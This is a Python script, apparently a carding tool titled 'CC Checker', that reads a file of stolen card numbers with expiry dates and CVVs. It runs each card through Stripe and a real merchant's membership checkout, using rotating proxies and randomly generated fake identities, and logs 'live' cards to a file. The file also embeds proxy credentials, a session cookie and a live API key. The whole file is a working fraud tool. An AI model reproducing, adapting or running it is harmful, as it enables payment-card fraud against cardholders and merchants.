# -*- coding: utf-8 -*-
#============== Moudles ==============#
import requests
from requests.exceptions import ProxyError
import json, string, re
import os, time, random, platform, colorama
from colorama import Fore, Back, Style
colorama.init()
#============== Moudles ==============#
def get_email(): 
	generated_email = str(''.join(random.choices(string.ascii_uppercase + string.digits, k = 8))) + '@gmail.com'
	return generated_email.lower()

def get_username():  
	generated_username = str(''.join(random.choices(string.ascii_uppercase + string.digits, k = 8)))
	return generated_username.capitalize()

def addsuccess(text):
	success = open("Valids.txt","a")
	success.write(text + "\n")
	success.close()

def checker(cc):
	splitter = cc.split('|')
	cc = splitter[0]
	mes = splitter[1]
	ano = splitter[2]
	cvv = splitter[3]
	bin = cc[:6]

	arr = ['http://bqqqfxeo-rotate:071h9m2354ed@p.webshare.io:80/']

	proxy = random.choice(arr)
	proxies = { 'http' : proxy, 'https' : proxy}

	res = requests.get("https://xblackxcoder.codes/bin/" + bin)
	bin_data = json.loads(res.text)
	vendor = bin_data["vendor"].lower()
	
	curl =  requests.Session()
	curl.proxies = proxies
	res = requests.get("https://randomuser.me/api/?nat=us&inc=name,location")
	random_data = json.loads(res.text)                      

	first_name = random_data['results'][0]['name']['first']
	last_name = random_data['results'][0]['name']['last']                     
	email = str(''.join(random.choices(string.ascii_lowercase + string.digits, k = 8))) + '@gmail.com'
	password = str("".join(random.choices(string.ascii_uppercase + string.digits, k=10)))

	sk_headers = {
	"authority": "api.stripe.com",
	"accept": "application/json",
	"accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
	"content-type": "application/x-www-form-urlencoded",
	"origin": "https://js.stripe.com",
	"referer": "https://js.stripe.com/",
	"user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36"}

	headers = {
	"authority": "my.smashgo.co",
	"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/",
	"accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
	"content-type": "application/x-www-form-urlencoded",
	"cookie": "PHPSESSID=0417s6hhofc6cgd4g5tbi72bge",
	"origin": "https://my.smashgo.co",
	"referer": "https://my.smashgo.co/account/membership-checkout/?level=8",
	"user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36"}

	lista = cc + "|" + mes + "|" + ano + "|" + cvv

	data = {
	'type':'card',
	'card[number]': cc,
	'card[cvc]': cvv,
	'card[exp_month]': mes,
	'card[exp_year]': ano,
	'guid':'f3abdff2-fbf9-422b-aed9-a41300a894819d9caf',
	'muid':'f2bc9140-eacc-48e2-812d-1f411d4fb4246b3558',
	'sid':'7ce1609d-f9bb-4179-8709-2b2ee683e501ef95db',
	'pasted_fields':'number',
	'payment_user_agent':'stripe.js/7338eae82; stripe-js-v3/7338eae82',
	'time_on_page':'40188',
	'key':'pk_live_51HGdXUCXgKhUdQ35qYXUKcjbluFQq0AIPhLy3P83tUjGeQ1zbC2wMKiPLVVfuJOvEc2r2hQl4CqDucjHhaQS6a0x00rP7pEwU0',}

	res = curl.post("https://api.stripe.com/v1/payment_methods",headers=sk_headers,data=data)
	json_first = json.loads(res.text)

	if 'error' in json_first:
		text = f"""{lista} |- RESULT: REJECTED [INCORRECT CARD]"""
		print(text)
	elif 'id' not in json_first:
		text = f"""{lista} |- RESULT: REJECTED [INCORRECT CARD]"""
		print(text)
	else:
		id = json_first["id"]
		data = f"level=8&levelstodel=&checkjavascript=1&other_discount_code=&username={get_username()}&password={password}&password2={password}&first_name={first_name}&last_name={last_name}&bemail={email}&bconfirmemail={email}&fullname=&gateway=stripe&CardType={vendor}&discount_code=&submit-checkout=1&javascriptok=1&javascriptok=1&payment_method_id={id}&AccountNumber={cc}&ExpirationMonth={mes}&ExpirationYear=ano"
		res = curl.post("https://my.smashgo.co/account/membership-checkout/?level=8",headers=headers,data=data)

		try:
			if 'incorrect_zip' in res.text or 'Your card zip code is incorrect.' in res.text or 'The zip code you supplied failed validation' in res.text or 'card zip code is incorrect' in res.text: 
				text = f"""{lista} |- RESULT: CVV LIVE [ZIP INCORRECT]"""
				print(text) 
				addsuccess(text);
			elif  '"seller_message": "Payment complete."' in res.text or '"cvc_check": "pass"' in res.text or 'thank_you' in res.text or '"type":"one-time"' in res.text or '"state": "succeeded"' in res.text or "Your payment has already been processed" in res.text or '"status": "succeeded"' in res.text : #or 'donation_number=' in res.text
				text = f"""{lista} |- RESULT: APPROVED [CVV MATCH]"""
				print(text) 
				addsuccess(text);
			elif "card has insufficient funds" in res.text or 'insufficient_funds' in res.text or 'Insufficient Funds' in res.text :
				text = f"""{lista} |- RESULT: APPROVED [LOW BALANCE]"""
				print(text) 
				addsuccess(text);                  
			elif "card's security code is incorrect" in res.text or "card&#039;s security code is incorrect" in res.text or "security code is invalid" in res.text or 'CVC was incorrect' in res.text or "incorrect CVC" in res.text or 'cvc was incorrect' in res.text or 'Card Issuer Declined CVV' in res.text :
				text = f"""{lista} |- RESULT: APPROVED [CVC MISMATCH]"""
				print(text) 
				addsuccess(text);  
			elif "card does not support this type of purchase" in res.text or 'transaction_not_allowed' in res.text or 'Transaction Not Allowed' in res.text: 
				text = f"""{lista} |- RESULT: APPROVED [PURCHASE NOT ALLOWED]"""
				print(text) 
				addsuccess(text);           
			elif "card number is incorrect" in res.text or 'incorrect_number' in res.text or 'Invalid Credit Card Number' in res.text or 'card number is incorrect' in res.text:
				text = f"""{lista} |- RESULT: REJECTED [CARD INCORRECT]"""
				print(text)       
			elif "Customer authentication is required" in res.text or "unable to authenticate" in res.text or "three_d_secure_redirect" in res.text or "hooks.stripe.com/redirect/" in res.text or 'requires an authorization' in res.text:
				text = f"""{lista} |- RESULT: REJECTED [3D SECURITY]"""
				print(text) 
			elif "card was declined" in res.text or 'card_declined' in res.text or 'The transaction has been declined' in res.text or 'Processor Declined' in res.text:
				text = f"""{lista} |- RESULT: REJECTED [CARD DECLINED]"""
				print(text)
			elif 'Do Not Honor' in res.text :
				text = f"""{lista} |- RESULT: REJECTED [NO NOT HONOR]"""
				print(text)
			elif "card has expired" in res.text or 'Expired Card' in res.text:
				text = f"""{lista} |- RESULT: REJECTED [CARD EXPIRED]"""
				print(text)             
			else:
				text = f"""{lista} |- RESULT: REJECTED [UNKOWN RESPONSE]"""
				print(text)
		except Exception as e:
			print(e)

if __name__ == '__main__':

	os.system('cls' if platform.system() == 'Windows' else 'clear')
	print(Fore.RED+requests.get("http://artii.herokuapp.com/make?text=CC Checker").text)
	print(Fore.GREEN+'By xBlacKx | @xBlackx_Coder | Channel:- @xBlackxCoder')
	print('')

	try:
		inpFile = input("Enter Your CC Combo File : ")
		file = open(inpFile).readlines()
		for lines in file:
			line = lines.replace('\n','')
			checker(lines)
	except Exception as e:
		print(e)
